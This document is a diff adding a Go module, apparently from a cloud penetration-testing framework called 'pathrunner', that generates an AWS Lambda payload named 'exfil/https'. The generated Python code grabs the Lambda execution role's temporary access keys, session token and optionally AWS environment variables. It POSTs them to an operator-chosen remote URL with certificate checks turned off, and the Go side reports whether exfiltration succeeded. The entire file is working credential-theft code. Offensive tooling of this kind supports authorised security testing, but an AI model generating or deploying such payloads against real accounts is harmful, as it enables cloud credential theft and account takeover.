@@ -1,0 +1,251 @@
+package lambda
+
+import (
+	"encoding/json"
+	"fmt"
+	"pathrunner/pkg/modules"
+	"pathrunner/pkg/payloads"
+	"strings"
+)
+
+type ExfilHTTPSPayload struct{}
+
+func NewExfilHTTPSPayload() *ExfilHTTPSPayload {
+	return &ExfilHTTPSPayload{}
+}
+
+func init() {
+	payloads.Register(NewExfilHTTPSPayload())
+}
+
+func (p *ExfilHTTPSPayload) GetName() string {
+	return "exfil/https"
+}
+
+func (p *ExfilHTTPSPayload) GetDescription() string {
+	return "Send extracted credentials to a remote HTTPS endpoint"
+}
+
+func (p *ExfilHTTPSPayload) GetTags() []string {
+	return []string{
+		payloads.TagServiceLambda,
+		payloads.TagLanguagePython,
+		payloads.TagTechniqueExfil,
+		payloads.TagTransportWebhook,
+	}
+}
+
+func (p *ExfilHTTPSPayload) GetOptions() []modules.Option {
+	return []modules.Option{
+		{
+			Name:        "HTTPS_URL",
+			Description: "Target HTTPS URL for credential exfiltration",
+			Required:    true,
+		},
+		{
+			Name:        "USER_AGENT",
+			Description: "Custom User-Agent string for HTTP requests",
+			Required:    false,
+			Default:     "Mozilla/5.0 (compatible; AWS-Lambda)",
+		},
+		{
+			Name:        "TIMEOUT",
+			Description: "HTTP request timeout in seconds",
+			Required:    false,
+			Default:     "10",
+		},
+		{
+			Name:        "INCLUDE_ENV",
+			Description: "Include Lambda environment variables in payload",
+			Required:    false,
+			Default:     "false",
+		},
+	}
+}
+
+func (p *ExfilHTTPSPayload) GenerateCode(options map[string]string) (string, error) {
+	httpsURL := options["HTTPS_URL"]
+	userAgent := options["USER_AGENT"]
+	if userAgent == "" {
+		userAgent = "Mozilla/5.0 (compatible; AWS-Lambda)"
+	}
+
+	timeout := options["TIMEOUT"]
+	if timeout == "" {
+		timeout = "10"
+	}
+
+	includeEnv := options["INCLUDE_ENV"] == "true"
+
+	envCode := ""
+	if includeEnv {
+		envCode = `
+        # Include environment variables
+        env_vars = {k: v for k, v in os.environ.items() if k.startswith(('AWS_', 'LAMBDA_'))}
+        payload['environment'] = env_vars`
+	}
+
+	code := `import json
+import boto3
+import os
+import urllib3
+
+def lambda_handler(event, context):
+    result = {
+        'message': 'Pathrunner HTTPS credential exfiltration',
+        'timestamp': context.aws_request_id,
+        'status': 'started'
+    }
+
+    try:
+        # Get temporary credentials from the Lambda execution role
+        sts_client = boto3.client('sts')
+        caller_identity = sts_client.get_caller_identity()
+
+        # Extract credentials from boto3 session
+        session = boto3.Session()
+        credentials = session.get_credentials()
+
+        # Prepare payload for remote endpoint
+        payload = {
+            'type': 'lambda_credential_exfil',
+            'timestamp': context.aws_request_id,
+            'caller_identity': {
+                'account': caller_identity.get('Account'),
+                'arn': caller_identity.get('Arn'),
+                'user_id': caller_identity.get('UserId')
+            },
+            'region': session.region_name or os.environ.get('AWS_REGION', 'unknown'),
+            'function_info': {
+                'name': context.function_name,
+                'version': context.function_version,
+                'memory_limit': context.memory_limit_in_mb,
+                'log_group': context.log_group_name,
+                'log_stream': context.log_stream_name
+            }
+        }
+
+        if credentials:
+            payload['credentials'] = {
+                'access_key_id': credentials.access_key,
+                'secret_access_key': credentials.secret_key,
+                'session_token': credentials.token
+            }` + envCode + `
+
+        # Send payload to remote endpoint (disable SSL verification for self-signed certs)
+        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+        headers = {
+            'User-Agent': '` + userAgent + `',
+            'Content-Type': 'application/json',
+            'X-Pathrunner': 'aws-lambda-exfil'
+        }
+
+        response = http.request(
+            'POST',
+            '` + httpsURL + `',
+            body=json.dumps(payload),
+            headers=headers,
+            timeout=` + timeout + `
+        )
+
+        result['exfil_status'] = 'success'
+        result['exfil_response_code'] = response.status
+        result['exfil_url'] = '` + httpsURL + `'
+
+        if response.status == 200:
+            result['message'] = 'Credentials successfully exfiltrated to remote endpoint'
+        else:
+            result['message'] = f'Remote endpoint returned status {response.status}'
+
+    except urllib3.exceptions.TimeoutError:
+        result['exfil_status'] = 'timeout'
+        result['message'] = 'Request to remote endpoint timed out'
+    except urllib3.exceptions.SSLError as e:
+        result['exfil_status'] = 'ssl_error'
+        result['message'] = f'SSL error: {str(e)}'
+    except Exception as e:
+        result['exfil_status'] = 'error'
+        result['message'] = f'Exfiltration failed: {str(e)}'
+
+    result['status'] = 'completed'
+
+    return {
+        'statusCode': 200,
+        'body': json.dumps(result, indent=2)
+    }
+`
+
+	return code, nil
+}
+
+func (p *ExfilHTTPSPayload) ProcessResult(result string) (string, error) {
+	var lambdaResponse map[string]interface{}
+	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
+		return result, err
+	}
+
+	body, ok := lambdaResponse["body"].(string)
+	if !ok {
+		return result, nil
+	}
+
+	var parsedBody map[string]interface{}
+	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
+		return result, err
+	}
+
+	var output strings.Builder
+	output.WriteString("=== HTTPS Exfiltration Results ===\n\n")
+
+	if message, ok := parsedBody["message"].(string); ok {
+		output.WriteString("Status: " + message + "\n")
+	}
+
+	if url, ok := parsedBody["exfil_url"].(string); ok {
+		output.WriteString("Target URL: " + url + "\n")
+	}
+
+	if status, ok := parsedBody["exfil_status"].(string); ok {
+		output.WriteString("Exfiltration Status: " + status + "\n")
+
+		if responseCode, ok := parsedBody["exfil_response_code"]; ok {
+			responseCodeStr := ""
+			if code, ok := responseCode.(float64); ok {
+				responseCodeStr = fmt.Sprintf("%.0f", code)
+			} else {
+				responseCodeBytes, _ := json.Marshal(responseCode)
+				responseCodeStr = string(responseCodeBytes)
+			}
+			output.WriteString("Response Code: " + responseCodeStr + "\n")
+		}
+	}
+
+	output.WriteString("\n")
+
+	switch parsedBody["exfil_status"] {
+	case "success":
+		output.WriteString("✓ Credentials successfully sent to remote endpoint\n")
+		output.WriteString("Check your collection server for the exfiltrated data.\n")
+	case "timeout":
+		output.WriteString("⚠ Request timed out - endpoint may be unreachable\n")
+	case "ssl_error":
+		output.WriteString("⚠ SSL error occurred - check certificate validity\n")
+	case "error":
+		output.WriteString("✗ Exfiltration failed - check the error message above\n")
+	}
+
+	if timestamp, ok := parsedBody["timestamp"].(string); ok {
+		output.WriteString("\nRequest ID: " + timestamp + "\n")
+	}
+
+	return output.String(), nil
+}
+
+func (p *ExfilHTTPSPayload) Validate(options map[string]string) error {
+	if options["HTTPS_URL"] == "" {
+		return fmt.Errorf("HTTPS_URL is required for exfil/https payload")
+	}
+	return nil
+}
